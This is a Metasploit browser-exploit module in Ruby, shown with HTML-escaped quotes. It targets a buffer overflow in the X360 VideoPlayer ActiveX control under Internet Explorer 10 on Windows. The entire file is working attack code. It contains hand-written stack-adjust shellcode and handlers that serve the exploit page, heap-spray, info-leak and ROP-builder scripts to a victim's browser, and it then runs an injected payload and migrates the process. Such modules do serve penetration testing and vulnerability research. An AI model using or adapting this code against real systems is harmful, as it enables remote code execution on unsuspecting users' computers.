# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;                => "X360 VideoPlayer ActiveX Control Buffer Overflow",
      &#039;Description&#039;         => %q{
        This module exploits a buffer overflow in the VideoPlayer.ocx ActiveX installed with the
        X360 Software. By setting an overly long value to &#039;ConvertFile()&#039;,an attacker can overrun
        a .data buffer to bypass ASLR/DEP and finally execute arbitrary code.
      },
      &#039;License&#039;             => MSF_LICENSE,
      &#039;Author&#039;              =>
        [
          &#039;Rh0&#039;,     # vulnerability discovery and exploit, all the hard work
          &#039;juan vazquez&#039; # msf module
        ],
      &#039;References&#039;          =>
        [
          [&#039;EDB&#039;, &#039;35948&#039;],
          [&#039;URL&#039;, &#039;https://rh0dev.github.io/blog/2015/fun-with-info-leaks/&#039;]
        ],
      &#039;Payload&#039;             =>
        {
          &#039;Space&#039;          => 1024,
          &#039;DisableNops&#039;    => true,
          &#039;PrependEncoder&#039; => stack_adjust
        },
      &#039;DefaultOptions&#039;      =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Platform&#039;            => &#039;win&#039;,
      &#039;Arch&#039;                => ARCH_X86,
      &#039;BrowserRequirements&#039; =>
        {
          :source  => /script|headers/i,
          :clsid   => "{4B3476C6-185A-4D19-BB09-718B565FA67B}",
          :os_name => OperatingSystems::Match::WINDOWS,
          :ua_name => Msf::HttpClients::IE,
          :ua_ver  => &#039;10.0&#039;
        },
      &#039;Targets&#039;             =>
        [
          [ &#039;Automatic&#039;, {} ]
        ],
      &#039;Privileged&#039;          => false,
      &#039;DisclosureDate&#039;      => "Jan 30 2015",
      &#039;DefaultTarget&#039;       => 0))
  end
 
  def stack_adjust
    adjust = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    adjust << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    adjust << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    adjust << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
 
    adjust
  end
 
  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")
 
    case request.uri
    when /exploit.js/
      print_status("Sending exploit.js...")
      headers = {&#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Content-Type&#039;=>&#039;application/javascript&#039;}
      send_exploit_html(cli, exploit_template(cli, target_info), headers)
    when /sprayer.js/
      print_status("Sending sprayer.js...")
      headers = {&#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Content-Type&#039;=>&#039;application/javascript&#039;}
      send_exploit_html(cli, sprayer_template(cli, target_info), headers)
    when /informer.js/
      print_status("Sending informer.js...")
      headers = {&#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Content-Type&#039;=>&#039;application/javascript&#039;}
      send_exploit_html(cli, informer_template(cli, target_info), headers)
    when /rop_builder.js/
      print_status("Sending rop_builder.js...")
      headers = {&#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Content-Type&#039;=>&#039;application/javascript&#039;}
      send_exploit_html(cli, rop_builder_template(cli, target_info), headers)
    else
      print_status("Sending main.html...")
      headers = {&#039;Pragma&#039; => &#039;no-cache&#039;, &#039;Content-Type&#039;=>&#039;text/html&#039;}
      send_exploit_html(cli, main_template(cli, target_info), headers)
    end
  end
 
  def main_template(cli, target_info)
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;edb-35948&#039;, &#039;main.html&#039;)
    template = &#039;&#039;
    File.open(path, &#039;rb&#039;) { |f| template = strip_comments(f.read) }
 
    return template, binding()
  end
 
  def exploit_template(cli, target_info)
    shellcode = Rex::Text.to_hex(get_payload(cli, target_info))
 
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;edb-35948&#039;, &#039;js&#039;, &#039;exploit.js&#039;)
    template = &#039;&#039;
    File.open(path, &#039;rb&#039;) { |f| template = strip_comments(f.read) }
 
    return template, binding()
  end
 
  def sprayer_template(cli, target_info)
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;edb-35948&#039;, &#039;js&#039;, &#039;sprayer.js&#039;)
    template = &#039;&#039;
    File.open(path, &#039;rb&#039;) { |f| template = strip_comments(f.read) }
 
    return template, binding()
  end
 
  def informer_template(cli, target_info)
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;edb-35948&#039;, &#039;js&#039;, &#039;informer.js&#039;)
    template = &#039;&#039;
    File.open(path, &#039;rb&#039;) { |f| template = strip_comments(f.read) }
 
    return template, binding()
  end
 
  def rop_builder_template(cli, target_info)
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;edb-35948&#039;, &#039;js&#039;, &#039;rop_builder.js&#039;)
    template = &#039;&#039;
    File.open(path, &#039;rb&#039;) { |f| template = strip_comments(f.read) }
 
    return template, binding()
  end
 
  def strip_comments(input)
    input.gsub(/\/\/.*$/, &#039;&#039;)
  end
 
end

